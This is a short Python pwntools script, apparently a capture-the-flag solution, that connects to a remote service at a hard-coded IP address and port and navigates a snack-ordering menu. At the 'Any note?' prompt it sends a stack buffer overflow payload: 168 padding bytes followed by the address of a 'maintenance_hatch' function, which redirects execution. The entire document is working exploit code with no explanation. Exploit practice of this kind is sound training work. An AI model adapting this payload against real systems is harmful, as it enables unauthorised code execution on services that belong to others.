from pwn import *

HOST = "109.123.232.54"
PORT = 1343

context.arch = "amd64"
context.log_level = "info"

offset = 168
maintenance_hatch = 0x4011c6

io = remote(HOST, PORT, timeout=5)

io.recvuntil(b"> ")
io.sendline(b"1")

io.recvuntil(b"Snack name: ")
io.sendline(b"snack")

io.recvuntil(b"Any note? ")

payload = b"A" * offset + p64(maintenance_hatch) + b"\n"
io.send(payload)

result = io.recvall(timeout=3)
print(result.decode(errors="replace"))

io.close()
